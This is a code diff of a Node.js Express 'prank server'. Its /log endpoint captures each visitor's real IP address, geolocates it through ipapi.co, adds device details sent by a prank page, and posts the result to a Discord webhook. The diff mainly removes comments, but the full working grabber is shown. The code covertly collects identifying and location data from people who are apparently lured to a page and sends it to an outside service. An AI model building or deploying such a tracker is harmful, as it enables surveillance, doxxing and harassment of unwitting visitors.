@@ -1,21 +1,19 @@
 const express = require('express');
 const axios = require('axios');
+
 const app = express();
 app.use(express.json());
 
-// Use environment variable from Render dashboard (DISCORD_WEBHOOK)
+// Load webhook from Render environment variables (set this in dashboard!)
 const DISCORD_WEBHOOK = process.env.DISCORD_WEBHOOK;
 
 if (!DISCORD_WEBHOOK) {
-  console.error('DISCORD_WEBHOOK environment variable is missing!');
+  console.error('DISCORD_WEBHOOK is missing in environment variables!');
 }
 
-// In-memory storage for last seen data per user (resets when server restarts)
-const lastData = {};
+const lastData = {}; // stores last seen data per user
 
-// The prank logging endpoint
 app.post('/log', async (req, res) => {
-  // Get real client IP (Render uses proxy header)
   let ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
   if (ip && ip.includes(',')) ip = ip.split(',')[0].trim();
 
@@ -23,12 +21,10 @@ app.post('/log', async (req, res) => {
   const deviceInfo = req.body.deviceInfo || {};
 
   try {
-    // Fetch approximate location from IP
     const geoResp = await axios.get(`https://ipapi.co/${ip}/json/`);
     const geo = geoResp.data;
-    if (geo.error) throw new Error(geo.reason || 'Geo lookup failed');
+    if (geo.error) throw new Error(geo.reason || 'Geo fail');
 
-    // Build the full info object
     const fullInfo = {
       ip,
       city: geo.city || '???',
@@ -41,7 +37,7 @@ app.post('/log', async (req, res) => {
       ...deviceInfo
     };
 
-    // Check if anything changed since last time
+    // This block MUST be INSIDE the function — NOT at top of file
     const last = lastData[userID];
     if (!last || JSON.stringify(last) !== JSON.stringify(fullInfo)) {
       if (DISCORD_WEBHOOK) {
@@ -52,20 +48,15 @@ app.post('/log', async (req, res) => {
       }
     }
 
-    // Remember this data for next time
     lastData[userID] = fullInfo;
-
-    // Send back the info to the prank page
     res.json(fullInfo);
   } catch (err) {
-    console.error('Error in /log:', err.message);
+    console.error('Error:', err.message);
     res.status(500).json({ error: 'Failed' });
   }
 });
 
-// Simple root route to confirm server is alive
 app.get('/', (req, res) => res.send('Prank server running!'));
 
-// Start the server on the port Render gives us
 const port = process.env.PORT || 3000;
 app.listen(port, () => console.log(`Running on port ${port}`));
